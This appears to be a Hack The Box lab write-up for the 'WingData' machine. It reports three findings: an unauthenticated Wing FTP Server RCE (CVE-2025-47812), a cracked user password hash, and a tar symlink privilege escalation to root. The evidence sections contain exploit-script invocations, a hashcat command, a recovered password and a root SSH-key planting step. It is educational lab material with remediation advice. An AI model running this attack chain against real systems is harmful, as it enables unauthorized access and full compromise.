# Findings - WingData HTB

This document summarizes the key vulnerabilities identified during the assessment of the WingData machine.

---

## 1. Unauthenticated Remote Code Execution (RCE)

### Description

The target is vulnerable to an unauthenticated remote code execution in Wing FTP Server (CVE-2025-47812).

The vulnerability is caused by improper handling of NULL bytes in the `username` parameter, allowing injection of Lua code into session files, which is later executed by the server.

---

### Impact

* Remote command execution without authentication
* Execution context: `wingftp` user
* Full compromise of the application layer

---

### Evidence

```bash
python3 wingftp_rce.py -u http://ftp.wingdata.htb -c id
```

Output:

```bash
uid=1000(wingftp) gid=1000(wingftp)
```

---

### Risk Level

Critical

---

## 2. Weak Credential Storage / Password Exposure

### Description

A password hash for user `wacky` was discovered on the system and successfully cracked using a dictionary-based attack.

---

### Impact

* Unauthorized SSH access
* Lateral movement from application user to system user

---

### Evidence

```bash
hashcat -m 1400 -a 6 wacky.hash rockyou.txt WingFTP
```

Recovered password:

```bash
!#7Blushing^*Bride5WingFTP
```

SSH access:

```bash
ssh wacky@<TARGET_IP>
```

---

### Risk Level

High

---

## 3. Insecure Backup Restore Mechanism (Privilege Escalation)

### Description

The system includes a vulnerable backup restore process that allows extraction of malicious TAR archives.

The vulnerability allows:

* Symlink chaining
* Path traversal
* Arbitrary file write as root

---

### Impact

* Write access to sensitive files (e.g. `/root/.ssh/authorized_keys`)
* Full privilege escalation to root

---

### Evidence

```bash
python3 tar_privesc_cve_2025_4138.py --preset ssh-key --payload ~/.ssh/wingdata_key.pub --tar-out backup.tar
```

Execution of restore process:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup.tar -r restore_pwn
```

Root access:

```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```

---

### Risk Level

Critical

---

## Summary of Findings

| # | Vulnerability                       | Severity |
| - | ----------------------------------- | -------- |
| 1 | Wing FTP RCE (CVE-2025-47812)       | Critical |
| 2 | Weak credential handling            | High     |
| 3 | Backup restore privilege escalation | Critical |

---

## General Observations

* Multiple critical vulnerabilities chained together
* Lack of input validation in the web application
* Insecure file handling mechanisms
* Weak credential protection practices

---

## Recommendations ( like real life job ) 
 
* Upgrade Wing FTP Server to a patched version
* Implement proper input validation and sanitization
* Secure backup/restore processes:

  * Prevent path traversal
  * Restrict symlink handling
* Enforce strong password policies
* Use secure hashing mechanisms with salting

---

## Disclaimer

This assessment was performed in a controlled Hack The Box environment for educational purposes only.
